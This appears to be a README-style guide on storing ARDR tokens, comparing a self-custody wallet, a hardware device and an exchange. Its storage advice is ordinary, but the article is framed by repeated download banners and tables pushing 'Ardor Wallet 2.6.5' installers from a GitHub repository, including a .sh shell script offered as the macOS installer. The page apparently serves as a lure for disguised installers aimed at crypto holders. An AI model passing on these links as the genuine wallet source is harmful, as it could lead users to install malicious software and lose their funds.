![Ardor Wallet guide](assets/banner-article.png)

# Where to store ARDR: wallet, hardware or exchange

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

ARDR can be held in the Ardor wallet you control, on a hardware device used with that wallet, or on an exchange that holds it for you. The first two give you the keys; the third gives you a claim on an exchange. Which is right depends on how often you move the balance and how much of it you would miss.

## The three places, compared

| Where | Who holds the keys | Best for | Main risk |
|---|---|---|---|
| Ardor wallet on your machine | You | Regular use, forging, features | A compromised computer or a lost secret |
| Hardware device with the wallet | You, on the device | Larger balances held for longer | Losing the device and the recovery phrase |
| Exchange account | The exchange | Active trading, small balances | The exchange's solvency and withdrawal policy |

The table is short because the decision is. Everything else on this page is about doing the chosen option properly.

## What self-custody actually requires

Holding [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) in your own wallet means the secret is the account. There is no issuer to call, no password reset and no fraud department. In exchange, nobody can freeze the balance, block a withdrawal or lose it in a bankruptcy.

The obligations are modest but not optional: a written secret in two places, a tested restore, a machine that is not full of unknown software, and the discipline not to type the secret into anything but the wallet. Skip any of those and self-custody becomes a slower way to lose funds than an [exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md).

None of them requires technical skill. They require the same thing a house key requires: that you keep it, and that you know where the spare is before you need it.

## Hardware devices

A [hardware device](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ledger-and-trezor-with-ardor-wallet.md) pairs with the desktop wallet instead: the key remains inside the device, and each signature needs a physical confirmation. Malware on the machine may see what is on screen; it still cannot produce a signature.

The cost is friction, and drawers are full of devices that felt like too much trouble. One workable split puts the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) you would notice losing on the hardware device and weekly spending in the software account. Two accounts, two written backups, one clear rule about which holds what.

The device is not a backup. It can be lost, broken or wiped by a firmware reset, and the recovery phrase is what restores the account afterwards. Store that phrase with the same care as any other secret, and never keep it only on the device itself.

## Cold storage without a device

If a hardware device is not an option, an account whose secret has never touched an online machine is a reasonable substitute. Generate it, write the secret down, and use it only to receive. That is cold storage in the sense that matters: the key is not on a networked computer.

Spending from such an account means typing the secret into a wallet on a machine you trust, which is why the practice works best as a savings account rather than a current account. Keep the spending money elsewhere.

## Exchange custody, honestly

An exchange balance is a claim, not a holding. The exchange controls the keys, sets the withdrawal rules, and decides what happens during a maintenance window or an insolvency. For a balance you are trading this week, that may be an acceptable trade.

For a balance you intend to keep, it is a poor fit, and the reason is not paranoia about any particular venue. It is that the arrangement puts a third party's operational risk between you and an asset whose entire point is that nobody can freeze it.

Withdrawal limits make the same point in a smaller way. A venue can change them overnight, and a balance you cannot move when you want to is a balance you do not control, however healthy its balance sheet looks.

## Moving between the three

Storage is not a permanent decision. A balance can start on an exchange, move to a software wallet for regular use, and move again to a hardware device once it grows - each step is a normal transaction with a normal fee.

The only rule is to do the small test transfer first and keep the previous arrangement working until the new one has both received and sent. A migration that closes the old door before the new key is tested is how balances become stories people tell in forums.

## A decision rule that holds up

1. Money you will spend or trade in the next month: exchange or hot wallet, kept small.
2. Money you are keeping: your own wallet, with the secret written down properly.
3. Money you would be upset to lose: hardware device, or an account whose secret has never been online.
4. Everything: a tested backup, because all three options fail the same way when the secret is lost.

That is the whole framework, and it scales down as well as up. A small holder with one rule - keep it in your own wallet and write the phrase down - is already doing the important part.

## FAQ

### Is it safer to leave ARDR on an exchange?

Only if you are trading it actively and accept custodial risk. For a long-term holding, the wallet you control is the safer arrangement.

### Do I need a hardware wallet for ARDR?

No. It becomes worthwhile when the balance is large enough that a compromised computer would be a serious loss.

### Can I keep ARDR in a paper wallet?

You can keep the secret on paper with no software involved, which is the same as an offline account. The paper is the account, so treat it as cash.

### What happens if I lose the hardware device?

Nothing, as long as you have the recovery phrase. The device is a signing tool; the phrase is the account.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [Use a Ledger or Trezor with the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ledger-and-trezor-with-ardor-wallet.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [How to buy ARDR, move it into your own wallet, and swap out](https://github.com/ardor-software/ardor-wallet-guides/blob/main/how-to-buy-ardor-and-ardr.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
